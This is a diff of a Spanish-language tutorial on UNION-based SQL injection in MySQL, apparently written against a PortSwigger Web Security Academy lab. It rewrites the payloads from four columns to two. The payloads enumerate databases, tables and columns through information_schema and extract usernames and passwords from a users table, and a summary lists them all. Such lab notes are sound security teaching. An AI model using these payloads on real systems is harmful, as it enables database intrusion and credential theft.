@@ -51,13 +51,13 @@ Si la inyección tiene éxito, la página mostrará los valores `1` y `2`  en la
 ## Obtener versión de MySQL
 
 ```sql
-' UNION SELECT 1, @@version, 3, 4-- -
+' UNION SELECT 1, @@version-- -
 ```
 
 ## Listar todas las bases de datos
 
 ```sql
-' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
+' UNION SELECT 1, schema_name FROM information_schema.schemata-- -
 ```
 Al ejecutar esta query, en el laboratorio de ejemplo de Portswigger vemos algo así:
 
@@ -73,16 +73,16 @@ En ocaciones, necesitaremos limitar la cantidad de información a mostrar. Para 
 
 **Nota:** para no tener que iterar por cada post que haya en la página podemos empezar la query SQLi de la URL a partir del `=` y no desde su valor `=Gifts`
 
-**Query habitual**: `https://web-security-academy.net/filter?category=Gifts' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -`
+**Query habitual**: `https://web-security-academy.net/filter?category=Gifts' UNION SELECT 1, schema_name FROM information_schema.schemata-- -`
 
-**Query sin post**: `https://web-security-academy.net/filter?category=Gifts' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata limit 0,1-- -`
+**Query sin post**: `https://web-security-academy.net/filter?category=Gifts' UNION SELECT 1, schema_name FROM information_schema.schemata limit 0,1-- -`
 
 ![Captura](./Imágenes/web_5.png)
 
 ## Listar tablas de una base de datos
 
 ```sql
-' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
 ```
 
 **Query realizada**
@@ -96,13 +96,13 @@ En ocaciones, necesitaremos limitar la cantidad de información a mostrar. Para 
 ## Listar columnas de una tabla
 
 ```sql
-' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
 ```
 
 ## Extraer usuarios de una tabla `users`
 
 ```sql
-' UNION SELECT 1, username, password, 4 FROM users-- -
+' UNION SELECT username, password FROM users-- -
 ```
 
 ---
@@ -110,12 +110,12 @@ En ocaciones, necesitaremos limitar la cantidad de información a mostrar. Para 
 ## Resumen de payloads usados
 
 ```sql
-1. ' UNION SELECT 1,2,3,4-- -
-2. ' UNION SELECT 1, @@version, 3, 4-- -
-3. ' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
-4. ' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
-5. ' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
-6. ' UNION SELECT 1, username, password, 4 FROM users-- -
+1. ' UNION SELECT 1,2-- -
+2. ' UNION SELECT 1, @@version-- -
+3. ' UNION SELECT 1, schema_name FROM information_schema.schemata-- -
+4. ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
+5. ' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
+6. ' UNION SELECT username, password FROM users-- -
 ```
 
 
